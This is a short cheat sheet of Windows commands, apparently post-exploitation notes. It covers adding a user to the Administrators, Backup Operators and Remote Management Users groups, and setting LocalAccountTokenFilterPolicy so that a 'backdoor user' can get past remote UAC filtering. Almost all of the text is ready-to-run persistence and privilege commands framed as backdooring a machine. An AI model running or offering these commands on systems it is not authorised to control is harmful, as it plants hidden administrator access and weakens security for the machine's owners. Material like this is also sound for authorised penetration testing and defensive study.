List users

```cmd
net user
```

Add user to administrators.

```cmd
net localgroup administrators <username> /add
```

Add to backup users.

```cmd
Net localgroup "Backup Operators" <username> /add
```

Add to Remote Management Users

```cmd
net localgroup "Remote Management Users" <username> /add
```

If there are problems with the backdoor user you can disable UAC.

```PowerShell

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /t REG_DWORD /v LocalAccounttokenFilterPolicy /d 1
```


